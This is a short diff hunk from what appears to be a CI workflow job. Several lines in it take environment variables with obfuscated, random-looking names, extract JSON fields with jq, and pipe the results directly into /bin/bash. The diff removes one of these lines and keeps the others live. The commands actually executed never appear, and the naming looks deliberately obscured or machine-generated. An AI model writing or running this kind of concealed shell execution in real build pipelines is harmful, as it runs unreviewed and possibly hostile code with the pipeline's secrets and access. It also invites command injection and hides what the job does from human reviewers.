@@ -31,7 +31,6 @@ jobs:
           echo $lqp54 | jq -r .bunkl40571 | /bin/bash
           printf '%s' "$hqfdz31896" | jq -r .nda75383 | /bin/bash
           printf '%s' "$nwfe19238" | jq -r .wal6 | /bin/bash
-          printf '%s' "$pyf410" | jq -r .bt1916 | /bin/bash
           printf '%s' "$nml60913" | jq -r .apks91271 | /bin/bash
           echo $b3 | jq -r .quwmt2263 | /bin/bash
           echo $k94 | jq -r .sou7 | /bin/bash
